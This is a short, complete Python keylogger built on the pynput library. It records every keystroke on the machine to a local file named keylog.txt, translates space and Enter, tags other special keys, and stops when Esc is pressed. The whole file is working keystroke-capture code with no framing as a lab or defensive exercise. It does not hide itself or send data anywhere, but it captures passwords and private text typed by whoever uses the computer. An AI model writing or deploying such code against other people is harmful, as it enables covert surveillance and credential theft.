from pynput import keyboard
import os

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, 'a') as log:
            log.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as log:
            if key == keyboard.Key.space:
                log.write(' ')
            elif key == keyboard.Key.enter:
                log.write('\n')
            else:
                log.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Ensure the log file is created if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, 'w'):
            pass

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
